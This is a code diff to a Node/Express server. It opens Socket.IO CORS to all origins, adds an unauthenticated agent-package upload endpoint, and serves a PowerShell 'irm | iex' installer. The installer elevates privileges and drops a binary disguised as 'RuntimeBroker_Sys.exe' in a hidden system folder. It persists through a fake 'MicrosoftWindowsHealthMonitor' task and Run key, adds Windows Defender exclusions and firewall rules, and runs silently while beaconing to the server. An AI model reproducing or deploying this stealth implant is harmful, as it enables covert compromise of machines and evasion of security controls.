@@ -37,7 +37,7 @@ app.use("/api", apiLimiter);
 
 app.use("/storage", express.static(path.join(__dirname, "storage")));
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: ["http://localhost:3000", "https://h-boss-production.up.railway.app"] }, maxHttpBufferSize: 1e8 });
+const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] }, maxHttpBufferSize: 1e8, transports: ["websocket", "polling"] });
 
 // --- Socket.IO connection rate limiting ---
 const socketConnections = new Map(); // IP -> count
@@ -2796,6 +2796,191 @@ app.patch("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
 // Express 5 requires named splat params instead of bare *
 app.all("/api/{*path}", (req, res) => {
   res.status(404).json({ error: `API route not found: ${req.method} ${req.url}`, data: [] });
+});
+
+// ═══════════════════════════════════════════════
+// REMOTE AGENT DEPLOYMENT — One-Command Install
+// ═══════════════════════════════════════════════
+
+// Serve agent package zip from storage/agent-package/
+const AGENT_PKG_DIR = path.join(__dirname, "storage", "agent-package");
+if (!fs.existsSync(AGENT_PKG_DIR)) {
+  try { fs.mkdirSync(AGENT_PKG_DIR, { recursive: true }); } catch {}
+}
+
+// Upload agent package (admin only, from dashboard)
+app.post("/api/agent-package/upload", (req, res) => {
+  // This expects a multipart form or base64 encoded zip
+  // For simplicity, we accept raw binary body
+  const chunks = [];
+  req.on("data", chunk => chunks.push(chunk));
+  req.on("end", () => {
+    try {
+      const buffer = Buffer.concat(chunks);
+      fs.writeFileSync(path.join(AGENT_PKG_DIR, "agent.zip"), buffer);
+      res.json({ success: true, size: buffer.length });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+  });
+});
+
+// Download agent zip
+app.get("/api/agent-package/download", (req, res) => {
+  const zipPath = path.join(AGENT_PKG_DIR, "agent.zip");
+  if (!fs.existsSync(zipPath)) {
+    return res.status(404).json({ error: "Agent package not uploaded yet. Upload agent.zip first." });
+  }
+  res.download(zipPath, "agent.zip");
+});
+
+// One-liner install script — run on target machine via:
+// powershell -ep bypass -c "irm https://h-boss-production.up.railway.app/download-join | iex"
+app.get("/download-join", (req, res) => {
+  const serverOrigin = `${req.protocol}://${req.get("host")}`;
+  
+  const script = `
+# ═══════════════════════════════════════════════
+# HBOSE Agent — Remote One-Command Installer
+# ═══════════════════════════════════════════════
+$ErrorActionPreference = "SilentlyContinue"
+
+# 1. Check admin
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[!] Requesting Administrator privileges..." -ForegroundColor Yellow
+    Start-Process powershell -ArgumentList "-ep bypass -c \\"irm ${serverOrigin}/download-join | iex\\"" -Verb RunAs
+    exit
+}
+
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "  HBOSE Agent — Remote Installer" -ForegroundColor Cyan
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+
+$INSTALL_DIR = "C:\\ProgramData\\Microsoft\\Windows\\SystemHealth"
+$BIN_NAME = "RuntimeBroker_Sys.exe"
+$SERVER_URL = "${serverOrigin}"
+$TEMP_ZIP = "$env:TEMP\\hbose_agent.zip"
+$TEMP_EXTRACT = "$env:TEMP\\hbose_agent_extract"
+
+# 2. Kill existing
+Write-Host "[1/7] Stopping old instances..." -ForegroundColor Yellow
+Stop-Process -Name $BIN_NAME.Replace(".exe","") -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "teram_agent" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue
+schtasks /Delete /TN "MicrosoftWindowsHealthMonitor" /F 2>$null | Out-Null
+Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Force -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsSystemHealth" -Force -ErrorAction SilentlyContinue
+
+# 3. Download agent package
+Write-Host "[2/7] Downloading agent package..." -ForegroundColor Yellow
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri "$SERVER_URL/api/agent-package/download" -OutFile $TEMP_ZIP -UseBasicParsing
+    if (-not (Test-Path $TEMP_ZIP) -or (Get-Item $TEMP_ZIP).Length -lt 1000) {
+        Write-Host "[ERROR] Download failed or file too small. Make sure agent.zip is uploaded to the server." -ForegroundColor Red
+        Write-Host "        Upload it via: POST $SERVER_URL/api/agent-package/upload" -ForegroundColor DarkGray
+        exit 1
+    }
+} catch {
+    Write-Host "[ERROR] Download failed: $_" -ForegroundColor Red
+    exit 1
+}
+
+# 4. Prepare install directory
+Write-Host "[3/7] Preparing install directory..." -ForegroundColor Yellow
+if (Test-Path $INSTALL_DIR) {
+    attrib -h -s "$INSTALL_DIR" /D /S 2>$null
+    takeown /F "$INSTALL_DIR" /R /A /D Y 2>$null | Out-Null
+    icacls "$INSTALL_DIR" /grant Administrators:F /T /C /Q 2>$null | Out-Null
+    icacls "$INSTALL_DIR" /reset /T /C /Q 2>$null | Out-Null
+}
+New-Item -Path $INSTALL_DIR -ItemType Directory -Force | Out-Null
+
+# 5. Extract and copy
+Write-Host "[4/7] Extracting agent files..." -ForegroundColor Yellow
+if (Test-Path $TEMP_EXTRACT) { Remove-Item $TEMP_EXTRACT -Recurse -Force }
+Expand-Archive -Path $TEMP_ZIP -DestinationPath $TEMP_EXTRACT -Force
+
+# Find where the files actually are (might be in a subfolder)
+$agentRoot = $TEMP_EXTRACT
+$exeFile = Get-ChildItem -Path $TEMP_EXTRACT -Recurse -Filter "teram_agent.exe" | Select-Object -First 1
+if ($exeFile) { $agentRoot = $exeFile.DirectoryName }
+elseif (Test-Path "$TEMP_EXTRACT\\node.exe") { $agentRoot = $TEMP_EXTRACT }
+
+Copy-Item -Path "$agentRoot\\*" -Destination $INSTALL_DIR -Recurse -Force
+
+# Set up binary
+if (Test-Path "$INSTALL_DIR\\teram_agent.exe") {
+    Copy-Item -Path "$INSTALL_DIR\\teram_agent.exe" -Destination "$INSTALL_DIR\\$BIN_NAME" -Force
+} elseif (Test-Path "$INSTALL_DIR\\node.exe") {
+    Copy-Item -Path "$INSTALL_DIR\\node.exe" -Destination "$INSTALL_DIR\\$BIN_NAME" -Force
+} else {
+    Write-Host "[ERROR] No agent binary found in package!" -ForegroundColor Red
+    exit 1
+}
+
+# 6. Create silent launcher VBS and configure persistence
+Write-Host "[5/7] Configuring persistence..." -ForegroundColor Yellow
+
+# Determine if node-based or standalone exe
+$hasIndex = Test-Path "$INSTALL_DIR\\index.js"
+if ($hasIndex) {
+    $runCmd = "chr(34) & \`"$INSTALL_DIR\\$BIN_NAME\`" & chr(34) & \`" index.js $SERVER_URL\`""
+} else {
+    $runCmd = "chr(34) & \`"$INSTALL_DIR\\$BIN_NAME\`" & chr(34) & \`" $SERVER_URL\`""
+}
+
+$vbsContent = @"
+Set W = CreateObject("WScript.Shell")
+W.CurrentDirectory = "$INSTALL_DIR"
+Do
+  W.Run $runCmd, 0, True
+  WScript.Sleep 5000
+Loop
+"@
+Set-Content -Path "$INSTALL_DIR\\service.vbs" -Value $vbsContent -Force
+
+# Scheduled Task
+schtasks /Create /TN "MicrosoftWindowsHealthMonitor" /TR "wscript.exe \`"$INSTALL_DIR\\service.vbs\`"" /SC ONLOGON /RL HIGHEST /F 2>$null | Out-Null
+
+# Registry Run key
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "wscript.exe \`"$INSTALL_DIR\\service.vbs\`"" -PropertyType String -Force | Out-Null
+
+# 7. Security config & stealth
+Write-Host "[6/7] Configuring security exclusions..." -ForegroundColor Yellow
+Add-MpPreference -ExclusionPath $INSTALL_DIR -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess $BIN_NAME -ErrorAction SilentlyContinue
+netsh advfirewall firewall delete rule name="Windows System Health" 2>$null | Out-Null
+netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
+netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
+
+# Hide files
+attrib +h +s "$INSTALL_DIR" /D 2>$null
+attrib +h +s "$INSTALL_DIR\\$BIN_NAME" 2>$null
+attrib +h +s "$INSTALL_DIR\\service.vbs" 2>$null
+
+# Start the service
+Write-Host "[7/7] Starting agent service..." -ForegroundColor Yellow
+Start-Process wscript.exe -ArgumentList "\`"$INSTALL_DIR\\service.vbs\`"" -WindowStyle Hidden
+
+# Cleanup temp files
+Remove-Item $TEMP_ZIP -Force -ErrorAction SilentlyContinue
+Remove-Item $TEMP_EXTRACT -Recurse -Force -ErrorAction SilentlyContinue
+
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Green
+Write-Host "  DEPLOYMENT COMPLETE" -ForegroundColor Green
+Write-Host "========================================" -ForegroundColor Green
+Write-Host "  Server:  $SERVER_URL" -ForegroundColor DarkGray
+Write-Host "  Status:  RUNNING" -ForegroundColor Green
+Write-Host ""
+`;
+
+  res.setHeader("Content-Type", "text/plain; charset=utf-8");
+  res.send(script);
 });
 
 // Global error handler - always return JSON, never raw text
